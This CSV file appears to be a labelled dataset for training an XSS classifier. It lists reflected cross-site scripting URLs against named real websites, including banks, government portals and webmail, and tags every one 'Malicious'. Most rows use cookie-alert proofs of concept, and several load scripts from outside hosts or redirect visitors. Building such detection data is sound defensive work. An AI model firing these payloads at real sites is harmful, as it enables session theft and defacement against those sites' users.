Payloads,Class
https://bankingportal.sparkasse-zollernalb.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google<br>.de%3e,Malicious
http://www.teachertube.com/login.php?username=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscri<br>pt%3e&amp;password=&amp;action_login=log+in,Malicious
http://www.aseanfoundation.org/index2.php?main=news/2008/2008-11-18.php&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious
http://www.habbohotel.com/iot/go?lang=en_us&amp;country=us&amp;text=%3c/textarea%3e%3cscript+src%3dhttp://vu<br>ln.xssed.net/thirdparty/scripts/hotpockets.js%3e,Malicious
http://s32.forumfree.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.posthorse.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.iso.org/iso/en/stdsdevelopment/tc/tclist/technicalcommitteedetailpage.technicalcommitteed<br>etail?commid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://hudba.heureka.cz/f--interpret_runrig-_-interpret_jay-z/%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e/,Malicious
http://interview.aqsiq.gov.cn:8080/was40/search?templet=demo_result.jsp&amp;searchword=%22%3e%3cscript%3<br>ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3<br>ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3<br>ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%<br>2520name%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3<br>c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;channelid=40734,Malicious
http://www.thailandtravel.or.jp/cgi-bin/search.cgi?search_strings='%3e%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
"http://newsroom.cisco.com/newsroom/flash/evp/?vidid=';alert(string.fromcharcode(83,69,67,85,82,73,84<br>,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;alert(str<br>ing.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromcharcode(83,69,67,85,8<br>2,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67<br>,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://www.inregistrare-domenii.ro/kb/search/?s=1&amp;q=%22%3e%3cscript%3ealert%28%2fxssed+by+dr.optix%2<br>f%29%3c%2fscript%3e&amp;sb=go,Malicious
http://jsp.netregistry.net/thebizcard.jsp?domain=abe.com.au/macro-search.html%22%3e%3cscript%3ealert<br>(1337)%3c/script%3e%22%3e%3cscript%3ealert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://cards.123greetings.com/cgi-bin/search/search.pl?log=123&amp;words=%22%3e%3cscript%3ealert(123)%3c<br>/script%3e,Malicious
http://home.szw.nl/index.cfm?menu_item_id=13735&amp;rubriek_id=391817&amp;rubriek_item=391839&amp;hoofdmenu_item<br>_id=&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious
"http://goodtimes.ndtv.com/video/videosearchlisting.aspx?keyword='>""><script>alert(/hexon/)</script>",Malicious
http://www.space.com/php/multimedia/imagegallery/igviewer.php?gid=413%22%3e%3c/title%3e%3cscript%3ea<br>lert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eisoz%20was%20here%20~biowormsecurity~%3c/h<br>1%3e%3c/marquee%3e,Malicious
http://www.eos.ubc.ca/about/faculty/m.bustin.html%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.ethnologue.com/country_index.asp?place=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,Malicious
http://www.accessdata.fda.gov/scripts/cdrh/cfdocs/cfmaude/results.cfm?searchstring=&amp;searchyear=&amp;prod<br>uctproblem=&amp;devicename=&amp;brandname=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e&amp;manufact<br>urer=&amp;eventtype=&amp;knumber=k&amp;pmanumber=p&amp;productcode=&amp;reportdatefrom=01%2f01%2f2006&amp;reportdateto=09%2f<br>29%2f2006&amp;pagenum=10&amp;submit=search,Malicious
http://www.psv.tv/index.php?item=search&amp;search=%22%3e%3cscript%3ealert+%28%2fkiller-tr%2f%29%3c%2fsc<br>ript%3e&amp;season=2010&amp;option=all&amp;x=0&amp;y=0,Malicious
http://www.floraselect.co.uk/start.php/index.php?page=shop&amp;action=viewproduct&amp;pid=3756/&quot;&gt;&lt;script&gt;ale<br>rt(1)&lt;/script&gt;,Malicious
http://www.monoprice.com/products/search.asp?keyword='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr<br>%3e%3cmarquee%3ewhitehat%20forever%3c/marque%3e,Malicious
http://www.distantcousin.com/search/norecordsfound.asp?query=%3ciframe%20src=javascript:alert(123)%3<br>e,Malicious
http://shop.nationalgeographic.com/ngs/facet/facetglossary.jsp?_dyncharset=utf-8&_dynsessconf=6134326913753448789&trailsize=1&advancedsearch=true&liveresult=true&categoryid=&trail=&addfacet=19016%3a1%3asrch%3a%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&removeallfacets=true&categoryfacetid=9004&trailtext=%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e&searchmenu=allcategories&search.x=16&search.y=17,Malicious
"http://gr.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.birgun.net/archive/result.php?q=%3cscript%3ealert%28%27xxsed+by+i-l%e2ndet+from+turkiye+%<br>21%21%21+%27%29%3c%2fscript%3e&amp;submit_form=sorguyu+g%f6nder&amp;action=quick&amp;offset=0,Malicious
http://www.theharvardshop.com/ths/products/default.asp?cat=gifts&amp;subcat=miscellaneous&amp;subsubcat=lett<br>er%20openers%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20b<br>y%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://farejador-1.ig.com.br/farejador/busca.do?palavrachave=&lt;script&gt;alert(&quot;xroot owned<br>you!&quot;)&lt;/script&gt;,Malicious
http://ms155.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.htk.dk/sitecore/notfound.aspx?item=%3cscript%3ealert('by%20st@rext')%3c/script%3e%3ch1%3e<br>by%20st@rext%3c/h1%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://festival.eurockeennes.fr:80/templates/gk_musictube/lib/scripts/menu.php?width=1&amp;height=1&amp;opac<br>ity=1&amp;animation=1&amp;speed=&lt;script&gt;alert(1337)&lt;/script&gt;,Malicious
http://www.rehber.gen.tr/adres/arama/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.reivisa.com/cgi_w/cfm/credit/rei/manage.cfm?ics_src=50361&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.wintermt.com/categories/primary.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;m<br>eta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://info4.juridicas.unam.mx/adprojus/leg/30/876/1353.htm?s=%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e,Malicious
http://ci.lemon-grove.ca.us/index.asp?nid=-404&amp;badlink=/search.asp?searchstring=cc&quot;&gt;&lt;script&gt;alert(&quot;b<br>luemax&quot;)&lt;/script&gt;,Malicious
http://www.domain-beispiel.de/ecms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://jasmine.blogdns.net/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/scr<br>ipt%3e,Malicious
http://benq.ru/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.3djuegos.com/index.php?busca_juego=%3cfont+size%3d72%3exss%3cfont%3e+&amp;zona=resultados-bus<br>queda,Malicious
http://www.gaytube.com/search/%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e%3cmarqu<br>ee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e/,Malicious
"http://www.microsoft.com/en-us/together/possibilities.aspx?hdrfo=mthdr02%27""--><svg><script><!>alert('xss');document.location.replace('http://xssed.com')</script>",Malicious
http://search.cableorganizer.com/search?w=%3c/script%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e%3cscript%3e//%20&amp;view=list&amp;prodsearch.x=0&amp;prodsearch.y=0&amp;prodsearch=go,Malicious
http://www.mste.uiuc.edu/~mmckelve/phpinfo.php?cx[][][][][][][][][][][][][][][][][][]=%22%3e%3cscrip<br>t%3ealert(document.cookie)%3c/script%3e,Malicious
http://link.members.freewebs.com/reloginlite.jsp?showsignup=1&amp;next=%22%3e%3cscript%3ealert%28%2fwww.<br>r3t.n3t.nl%2f%29%3c%2fscript%3e,Malicious
http://bbs.hld.gov.cn/register.cgi?forum=32%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53<br>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://shopping.indiatimes.com/%22/%3e%3cscript%3ealert%28%22xssed:-vinaag%22%29%3c/script%3e/search/,Malicious
http://liberdadenautica.com.br/site/miniatura.php?id=80889895&amp;foto=54%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c/script%3e%3c,Malicious
http://www.daboyds.com/igallery41sub/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://blogs.digitss.com/?s=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://blogs.adobe.com/adobereader/?s=%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://www.richinternet.de/blog/index.cfm?entry=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mcfa.gov.kh/index_en.php?nav=%22%3e%3cscript%3ealert(/xssed!/);%3c/script%3e,Malicious
http://rankmyhack.com/login.php?r=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(<br>1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://arizona.diamondbacks.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious
http://hostedads.realitykings.com/hosted/updates/generator.php?site[]=rb&amp;site[]=bt&amp;site[]=ft&amp;update=<br>update%20ad&amp;update=update%20ad&amp;update=update%20ad&amp;header=n&amp;destination=rk&amp;join=n&amp;thumbsize=m&amp;fontsiz<br>e=1337&amp;target=_new&amp;format=text_only&amp;type=latest&amp;rows=1337&amp;width=1337&amp;height=1337&amp;showsite=n&amp;headerbr<br>eak=1337&amp;bgcolor=black&quot;&gt;&lt;script&gt;alert(/xss by oz aka []0izy5@r00tdefaced.com/)&lt;/script&gt;,Malicious
http://www.addthis.com/feed.php?url=http%3a%2f%2fblog.addthis.com&amp;h1=http%3a%2f%2fblog.addthis.com?f<br>eed=rss2&amp;t1=add+this+feed&amp;pub=c%00%22%22%3cscript%3ealert(4649);%3c/script%3e,Malicious
http://www.bndes.gov.br/english/busca/resultado.asp?operacao=novabusca&amp;fdpesquisa=%3cscript%3ealert%<br>281%29%3c%2fscript%3e,Malicious
http://www.undergroundhiphop.com/store/searchresults.asp?searchby=artist&amp;keywords=&quot;&gt;&lt;/script&gt;&lt;script<br>&gt;alert(12)&lt;/script&gt;&amp;viewtype=row,Malicious
"http://www.zenith.com/index.asp?url=./sub_search/search.asp?fldkeywords=';alert(string.fromcharcode(<br>83,69,67,85,82,73,84,89,32,83,85,88))//\';alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85<br>,88))//%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(string.fromch<br>arcode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.f<br>romcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e%3cbody%20onload=alert('xss')%3e",Malicious
http://msn.wef.co.kr/weddinginfo/?bbs=174&amp;mode=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://forums.wow-europe.com/board.html?forumid=11088%3c/script%3e%3cscript%3ealert('airroxssed');%3<br>c/script%3e,Malicious
http://www.polskapomoc.gov.pl/index.php?query=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3<br>b%3c/script%3e&amp;length=10&amp;document=38,Malicious
http://h3.netster.com/search_redirect.php?keywords=%22%3e%3ciframe%20src=javascript:alert(123)%3e,Malicious
http://www.mooreinstitute.ie/search.php?search=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://ygc.com/news.php?page=1&id=54%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.tomshw.it/news_site.php?sezione=%22%3e%3cscript%3ealert(/hani/)%3c/script%3e,Malicious
http://www.comparex.es/cgi-bin/search?country=es&amp;language=es&amp;suchen=switched}%3c/style%3e%3cscript%3<br>ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,Malicious
http://www.dpsg-netzwerk-oe.de/cms/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://b.xmbs.jp/b2.php?id=kyoufu&amp;no=8899800'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;c_num=63525,Malicious
http://www.greenpeace.org/usa/news/offshore-drilling-it-s-not-t'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;xss%20by%20xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://hostedjobs.openhire.com/epostings/jobs/submit.cfm?fuseaction=dspjob&amp;id=23&amp;jobid=130970&amp;compan<br>y_id=15624&amp;version=1&amp;source=online&amp;jobowner=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;le<br>vel=levelid3&amp;levelid3=18247&amp;parent=st.%20louis%20corporate%20headquarters;;;information%20technology<br>;;;security&amp;startflag=3,Malicious
http://search.loc.gov:8765/query.html?bqwidth=%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2<br>fxss.js%3e%3c%2fscript%3e&amp;aqbkgrd=%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2fxss.js%3e%3<br>c%2fscript%3e&amp;locqclass=%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2fxss.js%3e%3c%2fscript<br>%3e&amp;imo=%3cscript+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2fxss.js%3e%3c%2fscript%3e&amp;qt=%3cscript<br>+src%3dhttp%3a%2f%2fdroptix.viralcoders.com%2fxss.js%3e%3c%2fscript%3e,Malicious
http://www.dbdirect.pt/resultado_top.asp?top=4&amp;distrito=13&amp;title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;<br>)&lt;/script&gt;,Malicious
http://gsdonline.com/bszs/adog.php?letter=%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3c/h1%3e,Malicious
http://www.wb.dl.gov.cn/search/search.vm?action=search&amp;content=%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.santander.cl/buscador/index.asp?s='%22%3e%3ch1%3exss%3c/h1%3e%3cscript%3ealert(1)%3c/scri<br>pt%3e,Malicious
https://webmail.telus.net/telusbeta/driver?nimlet=showlogin&amp;code=1002&amp;msg=%3cscript%3ealert%28docume<br>nt.cookie%29%3c/script%3e&amp;locale=en&amp;wtype=a,Malicious
http://www.answers.com/main/ntquery?s=%22%3e%3cscript%3ealert%28%27found+by+guru+of+hg%27%29%3c%2fsc<br>ript%3e&amp;gwp=13,Malicious
http://game.sina.com/cgi-bin/sinagamelogin.pl?version=gif&amp;gametype=mj16lobby1/mj16main%22%3e'%3e%3cs<br>cript%3ealert('xss')%3c/script%3e,Malicious
http://ad-click.jp/members/help.php?ssid='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/sc<br>ript%3e,Malicious
http://www.wholesalefirstaidsupplies.co.uk/shop/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3eal<br>ert(cyber-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
